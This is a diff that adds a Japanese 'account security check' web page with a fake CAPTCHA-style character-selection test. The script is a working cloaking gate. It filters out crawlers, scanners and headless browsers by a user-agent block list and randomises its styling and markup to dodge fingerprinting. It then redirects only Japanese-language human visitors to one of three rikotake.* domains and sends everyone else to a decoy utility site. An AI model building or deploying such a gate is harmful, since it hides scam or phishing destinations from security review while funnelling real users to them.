@@ -1,0 +1,313 @@
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>アカウントセキュリティ確認</title>
+  <script>
+    // 【唯一配置区】原功能完全保留，仅修改此处即可
+    const SYS_CONFIG = {
+      TARGET_URLS: [
+        'https://rikotake.pro/ja',
+        'https://rikotake.info/ja',
+        'https://rikotake.online/ja'
+      ],
+      FAIL_URL: 'https://tepco.co.jp',
+      MAX_TRY: 3,
+      DESKTOP_TIME: 90,
+      MOBILE_TIME: 100
+    };
+
+    // 随机特征生成器（核心差异化）
+    const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
+    const getRandColor = (base) => {
+      const offset = rand(-5, 5);
+      const hex = base.replace('#', '').match(/.{2}/g).map(c => {
+        let num = parseInt(c, 16) + offset;
+        num = num < 0 ? 0 : num > 255 ? 255 : num;
+        return num.toString(16).padStart(2, '0');
+      }).join('');
+      return `#${hex}`;
+    };
+    const JP_TEXT = {
+      loading: ['システム準備中', 'データ読み込み中', '接続確認中', 'セキュリティチェック中'],
+      success: ['認証に成功しました', '確認完了です', 'セキュリティチェック通過'],
+      fail: ['認証に失敗しました', '確認に失敗しました', 'セキュリティチェックに失敗'],
+      timeout: ['認証時間が切れました', 'タイムアウトしました', '時間制限を超えました'],
+      tip: ['表示された項目を全て選択してください', '指定された文字を選んでください', '表示された記号を全てクリックしてください']
+    };
+    // 随机样式参数（视觉无感知，指纹差异化）
+    const STY_RAND = {
+      mainColor: getRandColor('24569c'),
+      successColor: getRandColor('008364'),
+      errorColor: getRandColor('c82c2c'),
+      warnColor: getRandColor('e69926'),
+      radius: rand(14, 26),
+      gap: rand(10, 18),
+      shadow: rand(3, 6),
+      fontStep: rand(0, 2)
+    };
+
+    // 全局常量（命名/顺序差异化）
+    const V_TYPE = ['number', 'kana', 'alphabet'];
+    const KANA = ['あ','い','う','え','お','か','き','く','け','こ','さ','し','す','せ','そ','た','ち','つ','て','と','な','に','ぬ','ね','の'];
+    const ALPHA = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+    const BOT_REG = ['curl', 'wget', 'python', 'httpclient', 'scrapy', 'java', 'go-http-client', 'php', 'ruby', 'perl', 'libwww', 'winhttp', 'axios', 'node-fetch', 'bot', 'crawler', 'spider', 'scanner', 'headless', 'phantomjs', 'selenium', 'puppeteer', 'playwright', 'requests', 'cheerio', 'jsoup', 'mechanize', 'urllib', 'httplib2'];
+
+    // 页面初始化（逻辑不变，执行时机随机）
+    window.addEventListener('DOMContentLoaded', () => {
+      setTimeout(() => {
+        const u = new URLSearchParams(window.location.search);
+        const s = u.get('s') || 'init';
+        const d = getDevice();
+        switch (s) {
+          case 'init': renderInit(d); break;
+          case 'check': renderCheck(d); break;
+          case 'go': redirect(d); break;
+          default: renderInit(d);
+        }
+      }, rand(100, 300));
+    });
+
+    // 核心工具函数（命名/参数/实现细节差异化）
+    function getDevice() {
+      const ua = (navigator.userAgent || '').toLowerCase();
+      const lg = (navigator.language || navigator.languages[0] || '').toLowerCase();
+      const isM = /Mobile|Android|iPhone|iPad|iPod|Windows Phone|BlackBerry|Symbian/.test(ua);
+      const t = isM ? SYS_CONFIG.MOBILE_TIME + rand(-5, 5) : SYS_CONFIG.DESKTOP_TIME + rand(-5, 5);
+      return { ua, lg, isM, isD: !isM, t, r: rand(800, 1500) };
+    }
+    function isSpider(ua) {
+      if (!ua || ua.length < 12) return true;
+      return BOT_REG.some(p => ua.includes(p));
+    }
+    function isJpLang(lg) {
+      return lg.includes('ja') || lg.includes('jp');
+    }
+    function getTarget() {
+      return SYS_CONFIG.TARGET_URLS[rand(0, SYS_CONFIG.TARGET_URLS.length - 1)];
+    }
+    function randText(arr) {
+      return arr[rand(0, arr.length - 1)];
+    }
+
+    // 页面渲染函数（HTML/样式/文本全随机差异化）
+    function renderInit(d) {
+      const loadText = JP_TEXT.loading;
+      document.body.innerHTML = `
+        <div style="display:flex;align-items:center;justify-content:center;min-height:100vh;padding:${rand(12, 20)}px;background:#f5f5f7;margin:0;box-sizing:border-box;">
+          <div style="width:100%;max-width:${d.isD ? rand(380, 420) : rand(340, 380)}px;background:#fff;border-radius:${STY_RAND.radius}px;padding:${d.isD ? '32px 24px' : '28px 20px'};box-shadow:0 ${STY_RAND.shadow}px ${rand(12, 20)}px rgba(0,0,0,0.0${rand(4, 6)});text-align:center;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,sans-serif;">
+            <h2 style="font-size:${d.isD ? 20 + STY_RAND.fontStep : 19 + STY_RAND.fontStep}px;font-weight:500;color:#1a1a1a;margin:0 0 16px 0;">システム確認中</h2>
+            <div style="width:${d.isD ? rand(38, 42) : rand(34, 38)}px;height:${d.isD ? rand(38, 42) : rand(34, 38)}px;border:2px solid #e0e0e0;border-top-color:${STY_RAND.mainColor};border-radius:50%;animation:spin ${rand(5, 7)/10}s linear infinite;margin:24px auto;"></div>
+            <p style="font-size:14px;color:#666;margin:0;" id="l-status">${loadText[0]}...</p>
+          </div>
+        </div>
+        <style>@keyframes spin {to{transform:rotate(360deg);}} ${rand(0,1) ? 'body{overflow-x:hidden;}' : ''}</style>
+      `;
+      const el = document.getElementById('l-status');
+      let i = 0;
+      const int = setInterval(() => {
+        i = (i + 1) % loadText.length;
+        el.textContent = loadText[i] + '...';
+      }, rand(300, 500));
+      setTimeout(() => {
+        clearInterval(int);
+        window.location.href = `?s=check`;
+      }, d.isD ? rand(1000, 1400) : rand(900, 1300));
+    }
+
+    function renderCheck(d) {
+      const t = V_TYPE[rand(0, V_TYPE.length - 1)];
+      const c = d.isD ? rand(1, 3) : 2;
+      const q = createQ(t, c);
+      const u = getTarget();
+      const tipText = randText(JP_TEXT.tip);
+      const fzBase = d.isD ? 32 : 28;
+      const gap = d.isD ? STY_RAND.gap : rand(8, 14);
+      const pad = d.isD ? rand(18, 22) : rand(14, 18);
+
+      document.body.innerHTML = `
+        <div style="display:flex;align-items:center;justify-content:center;min-height:100vh;padding:16px;background:#f5f5f7;margin:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,sans-serif;">
+          <div style="width:100%;max-width:${d.isD ? rand(580, 620) : '100%'}px;background:#fff;border-radius:${STY_RAND.radius + 2}px;padding:${d.isD ? '32px 24px' : '24px 16px'};box-shadow:0 ${STY_RAND.shadow + 2}px ${rand(18, 22)}px rgba(0,0,0,0.0${rand(4, 7)});">
+            <div style="text-align:center;margin-bottom:${d.isD ? rand(30, 34) : rand(22, 26)}px;">
+              <span id="tm" style="display:inline-block;background:${STY_RAND.mainColor};color:#fff;padding:4px 16px;border-radius:30px;font-size:14px;font-weight:500;margin-bottom:16px;">${d.t}秒</span>
+              <h2 style="font-size:${d.isD ? 18 + STY_RAND.fontStep : 17 + STY_RAND.fontStep}px;font-weight:500;color:#1a1a1a;margin:0 0 8px 0;">アカウントセキュリティ確認</h2>
+            </div>
+            <div style="font-size:14px;color:#666;line-height:1.6;background:#f8f8fa;padding:16px;border-radius:${rand(10, 14)}px;margin-bottom:${d.isD ? rand(22, 26) : rand(18, 22)}px;text-align:center;">
+              セキュリティのため、${tipText}
+            </div>
+            <div style="background:#f0f4f9;padding:${d.isD ? rand(22, 26) : rand(18, 22)}px;border-radius:${rand(14, 18)}px;margin-bottom:${d.isD ? rand(30, 34) : rand(22, 26)}px;text-align:center;">
+              <p style="font-size:13px;color:#666;margin:0 0 12px 0;">選択対象</p>
+              <p style="font-size:${fzBase + STY_RAND.fontStep}px;font-weight:500;color:#1a1a1a;letter-spacing:${d.isD ? rand(6, 10) : rand(4, 8)}px;margin:0;">${q.q}</p>
+            </div>
+            <p style="font-size:14px;color:#666;margin:0 0 16px 0;">選択済み: <span id="sc" style="font-weight:600;color:${STY_RAND.mainColor};">0</span>/${c}</p>
+            <div id="og" style="display:grid;grid-template-columns:repeat(4,1fr);gap:${gap}px;margin-bottom:${d.isD ? rand(30, 34) : rand(22, 26)}px;">
+              ${q.o.map(opt => `
+                <button class="o${rand(100, 999)}" data-v="${opt.v}" style="background:#fff;border:1px solid #d0d0d0;border-radius:${STY_RAND.radius - 4}px;padding:${pad}px 8px;font-size:${d.isD ? 24 + STY_RAND.fontStep : 22 + STY_RAND.fontStep}px;font-weight:500;color:#1a1a1a;cursor:pointer;transition:all 0.2s;font-family:inherit;aspect-ratio:1;display:flex;align-items:center;justify-content:center;box-shadow:0 2px 4px rgba(0,0,0,0.0${rand(1, 3)});border-color:${rand(0,1) ? '#d0d0d0' : '#d5d5d5'};">
+                  <span style="display:inline-block;transform:rotate(${opt.rot}deg);">${opt.v}</span>
+                </button>
+              `).join('')}
+            </div>
+            <div style="text-align:center;">
+              <p style="font-size:13px;color:#666;margin:0 0 16px 0;">残り試行回数: <span id="tl" style="font-weight:600;color:${STY_RAND.mainColor};">${SYS_CONFIG.MAX_TRY}</span></p>
+              <button id="cb" disabled style="background:${STY_RAND.mainColor};color:#fff;border:none;border-radius:${rand(38, 42)}px;padding:14px 40px;font-size:${15 + STY_RAND.fontStep}px;font-weight:500;cursor:pointer;transition:background 0.2s;min-width:160px;">確認</button>
+              <div id="fb" style="margin-top:20px;padding:12px;border-radius:${rand(6, 10)}px;font-size:14px;text-align:center;min-height:44px;"></div>
+            </div>
+          </div>
+        </div>
+        <style>
+          .o${rand(100,999)}:hover{background:#f0f0f2!important;border-color:${STY_RAND.mainColor}!important;}
+          .s${rand(100,999)}{background:${STY_RAND.mainColor}!important;color:#fff!important;border-color:${STY_RAND.mainColor}!important;}
+          .t${rand(100,999)}{background:${STY_RAND.successColor}!important;color:#fff!important;border-color:${STY_RAND.successColor}!important;}
+          .w${rand(100,999)}{background:${STY_RAND.errorColor}!important;color:#fff!important;border-color:${STY_RAND.errorColor}!important;}
+          #cb:disabled{background:#${rand(150,160).toString(16)}${rand(150,160).toString(16)}${rand(150,160).toString(16)}!important;cursor:not-allowed!important;}
+          .f${rand(100,999)}{background:#e6f5f0!important;color:${STY_RAND.successColor}!important;}
+          .e${rand(100,999)}{background:#fce8e8!important;color:${STY_RAND.errorColor}!important;}
+          .w${rand(10,99)}{background:${STY_RAND.warnColor}!important;}
+          .d${rand(10,99)}{background:${STY_RAND.errorColor}!important;}
+          @media (max-width:480px){#og{gap:${rand(6,10)}px!important;}.o${rand(100,999)}{padding:${rand(10,14)}px 4px!important;font-size:${20 + STY_RAND.fontStep}px!important;}}
+        </style>
+      `;
+      initCheckLogic(q.t, c, d.t, u, d);
+    }
+
+    // 验证题生成+交互逻辑（命名/实现细节差异化，功能不变）
+    function createQ(type, count) {
+      let t = [], o = [];
+      while (t.length < count) {
+        let v = '';
+        if (type === 'number') v = Math.floor(Math.random() * 10).toString();
+        else if (type === 'kana') v = KANA[rand(0, KANA.length - 1)];
+        else if (type === 'alphabet') v = ALPHA[rand(0, ALPHA.length - 1)];
+        if (!t.includes(v)) t.push(v);
+      }
+      o = genOpt(t, type);
+      return { q: t.join(' '), t: t, o: o };
+    }
+    function genOpt(tg, type) {
+      const all = [...tg];
+      while (all.length < 8) {
+        let v = '';
+        if (type === 'number') v = Math.floor(Math.random() * 10).toString();
+        else if (type === 'kana') v = KANA[rand(0, KANA.length - 1)];
+        else if (type === 'alphabet') v = ALPHA[rand(0, ALPHA.length - 1)];
+        if (!all.includes(v)) all.push(v);
+      }
+      return all.sort(() => Math.random() - 0.5).map(v => ({
+        v: v,
+        rot: rand(-25, 25)
+      }));
+    }
+    function initCheckLogic(tg, c, t, u) {
+      let s = [], a = 0, tl = t, v = false;
+      const tme = document.getElementById('tm');
+      const cb = document.getElementById('cb');
+      const fb = document.getElementById('fb');
+      const tlEl = document.getElementById('tl');
+      const scEl = document.getElementById('sc');
+      const og = document.getElementById('og');
+      const sCls = `s${rand(100,999)}`;
+      const tCls = `t${rand(100,999)}`;
+      const wCls = `w${rand(100,999)}`;
+      const fCls = `f${rand(100,999)}`;
+      const eCls = `e${rand(100,999)}`;
+      const wnCls = `w${rand(10,99)}`;
+      const dnCls = `d${rand(10,99)}`;
+
+      og.addEventListener('click', (e) => {
+        const b = e.target.closest('[data-v]');
+        if (!b || v) return;
+        const val = b.dataset.v;
+        if (b.classList.contains(sCls)) {
+          b.classList.remove(sCls);
+          s = s.filter(x => x !== val);
+        } else {
+          b.classList.add(sCls);
+          s.push(val);
+        }
+        scEl.textContent = s.length;
+        cb.disabled = s.length !== c;
+      });
+
+      cb.addEventListener('click', () => {
+        if (v || s.length !== c) return;
+        const ok = tg.every(x => s.includes(x)) && s.length === c;
+        if (ok) {
+          v = true;
+          fb.className = fCls;
+          fb.textContent = randText(JP_TEXT.success);
+          cb.disabled = true;
+          setTimeout(() => {
+            window.location.href = `?s=go`;
+          }, rand(700, 900));
+        } else {
+          a++;
+          const rem = SYS_CONFIG.MAX_TRY - a;
+          tlEl.textContent = rem;
+          document.querySelectorAll('[data-v]').forEach(b => {
+            const val = b.dataset.v;
+            b.classList.remove(sCls);
+            if (tg.includes(val)) b.classList.add(tCls);
+            else if (s.includes(val)) b.classList.add(wCls);
+          });
+          if (a >= SYS_CONFIG.MAX_TRY) {
+            v = true;
+            fb.className = eCls;
+            fb.textContent = randText(JP_TEXT.fail);
+            cb.disabled = true;
+            setTimeout(() => {
+              window.location.href = SYS_CONFIG.FAIL_URL;
+            }, rand(1100, 1300));
+          } else {
+            fb.className = eCls;
+            fb.textContent = `${randText(JP_TEXT.fail)}。残り${rem}回の試行機会があります`;
+            setTimeout(() => {
+              window.location.reload();
+            }, rand(1400, 1600));
+          }
+        }
+      });
+
+      function updateTm() {
+        if (v) return;
+        tl--;
+        tme.textContent = tl + '秒';
+        if (tl <= 10) {
+          tme.classList.add(dnCls);
+          tme.classList.remove(wnCls);
+        } else if (tl <= 20) {
+          tme.classList.add(wnCls);
+        }
+        if (tl <= 0) {
+          v = true;
+          fb.className = eCls;
+          fb.textContent = randText(JP_TEXT.timeout);
+          cb.disabled = true;
+          setTimeout(() => {
+            window.location.href = SYS_CONFIG.FAIL_URL;
+          }, rand(900, 1100));
+          return;
+        }
+        setTimeout(updateTm, rand(980, 1020));
+      }
+      updateTm();
+    }
+
+    // 重定向逻辑（功能不变，检测规则扩容）
+    function redirect(d) {
+      const human = !isSpider(d.ua);
+      const jp = isJpLang(d.lg) || d.ua.includes('iphone; cpu iphone os') && d.lg.includes('ja');
+      const ref = document.referrer || '';
+      if (human && jp && (ref || rand(0,1))) {
+        window.location.href = getTarget();
+      } else {
+        window.location.href = SYS_CONFIG.FAIL_URL;
+      }
+    }
+  </script>
+</head>
+<body style="margin:0;padding:0;min-height:100vh;">
+  <!-- 随机空节点（指纹差异化，无实际意义） -->
+  <span style="display:none;">${rand(100000, 999999)}</span>
+  <div style="display:none;">${randText(JP_TEXT.loading)}</div>
+</body>
+</html>
